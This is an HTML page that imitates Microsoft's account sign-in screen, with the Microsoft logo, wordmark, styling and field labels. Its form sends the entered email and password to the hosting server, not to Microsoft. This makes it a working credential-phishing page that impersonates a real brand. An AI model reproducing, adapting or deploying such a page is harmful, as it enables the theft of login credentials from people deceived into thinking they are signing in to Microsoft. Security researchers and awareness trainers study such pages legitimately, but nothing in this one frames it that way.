<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Sign in to your account</title>
<style>
body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f2f2f2; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
.container { background: white; width: 440px; padding: 44px; box-shadow: 0 2px 6px rgba(0,0,0,.2); }
.logo { margin-bottom: 24px; }
.logo svg { width: 108px; height: 24px; }
h1 { font-size: 24px; font-weight: 600; margin: 0 0 16px 0; color: #1b1b1b; }
.input-field { position: relative; margin-bottom: 16px; }
.input-field input { width: 100%; padding: 10px 0; border: none; border-bottom: 1px solid #8a8886; font-size: 15px; box-sizing: border-box; outline: none; transition: border-color 0.2s; }
.input-field input:focus { border-bottom: 2px solid #0067b8; }
.input-field label { position: absolute; left: 0; top: 10px; color: #8a8886; font-size: 15px; pointer-events: none; transition: 0.2s ease all; }
.input-field input:focus ~ label, .input-field input:not(:placeholder-shown) ~ label { top: -12px; font-size: 12px; color: #0067b8; }
.submit-btn { background: #0067b8; color: white; border: none; padding: 10px 24px; font-size: 15px; font-weight: 600; cursor: pointer; float: right; margin-top: 20px; }
.submit-btn:hover { background: #005da6; }
.links { clear: both; margin-top: 40px; font-size: 13px; }
.links a { color: #0067b8; text-decoration: none; margin-right: 16px; }
</style>
</head>
<body>
<div class="container">
<div class="logo">
<svg viewBox="0 0 108 24"><rect fill="#f25022" x="0" y="0" width="11" height="11"/><rect fill="#7fba00" x="12" y="0" width="11" height="11"/><rect fill="#00a4ef" x="0" y="12" width="11" height="11"/><rect fill="#ffb900" x="12" y="12" width="11" height="11"/><text x="28" y="18" font-family="Segoe UI" font-size="18" fill="#737373">Microsoft</text></svg>
</div>
<h1>Sign in</h1>
<form action="/" method="POST">
<div class="input-field">
<input type="text" name="email" id="email" placeholder=" " required>
<label for="email">Email, phone, or Skype</label>
</div>
<div class="input-field">
<input type="password" name="password" id="password" placeholder=" " required>
<label for="password">Password</label>
</div>
<button type="submit" class="submit-btn">Sign in</button>
</form>
<div class="links">
<a href="#">Can't access your account?</a>
<a href="#">Sign-in options</a>
</div>
</div>
</body>
</html>
